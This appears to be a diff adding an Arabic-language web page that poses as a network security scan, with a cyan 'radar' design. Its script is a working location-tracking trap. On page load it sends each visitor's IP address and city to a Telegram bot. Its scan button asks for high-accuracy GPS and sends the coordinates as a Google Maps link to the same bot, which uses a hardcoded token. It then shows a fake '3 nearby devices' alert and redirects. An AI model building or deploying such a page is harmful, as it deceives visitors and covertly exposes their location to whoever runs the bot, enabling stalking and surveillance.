@@ -1,0 +1,73 @@
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فحص الاتصال - شبكتي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        body { background: #050a10; color: #00f2fe; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .card { background: rgba(16, 24, 39, 0.9); padding: 40px; border-radius: 30px; border: 1px solid #00f2fe; text-align: center; width: 90%; max-width: 420px; box-shadow: 0 0 40px rgba(0, 242, 254, 0.1); }
+        .radar { width: 120px; height: 120px; border: 2px solid #00f2fe; border-radius: 50%; margin: 0 auto 25px; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        h1 { font-size: 18px; letter-spacing: 2px; margin-bottom: 15px; }
+        p { color: #8892b0; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
+        .btn { background: #00f2fe; color: #050a10; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        .btn:hover { box-shadow: 0 0 20px #00f2fe; }
+        #status { margin-top: 15px; color: #fff; display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="radar">📶</div>
+        <h1>فحص الاتصال</h1>
+        <p>جاري البحث عن الثغرات الأمنية. يرجى السماح بالوصول للموقع (GPS).</p>
+        <button class="btn" onclick="startTrap()">بدء الفحص</button>
+        <div id="status">جاري المعالجة...</div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8025618094:AAHsq1aXw2TjmKp4CdzJB1701AmMGGgH0";
+        const CHAT_ID = "1286598503";
+        
+        (async function() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                const text = `🌐 **دخول جديد (IP Tracker)**\nمدينة: ${d.city}\nIP: \`${d.ip}\``;
+                sendData(text);
+            } catch(e) {}
+        })();
+        
+        function startTrap() {
+            document.getElementById('status').style.display = 'block';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(onSuccess, onError, {enableHighAccuracy: true, timeout: 10000});
+            }
+        }
+        
+        async function onSuccess(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const accuracy = pos.coords.accuracy;
+            const googleMap = `https://www.google.com/maps?q=${lat},${lon}`;
+            const finalMsg = `🎏 **تم سحب موقع GPS**\n📄 الخريطة: ${googleMap}\n📈 الدقة: ${accuracy.toFixed(1)} متر`;
+            await sendData(finalMsg);
+            alert("تم اكتشاف 3 أجهزة قريبة!");
+            window.location.href = "https://www.google.com/maps";
+        }
+        
+        function onError(err) {
+            alert("يجب السماح بالوصول للموقع!");
+        }
+        
+        async function sendData(msg) {
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
+            });
+        }
+    </script>
+</body>
+</html>
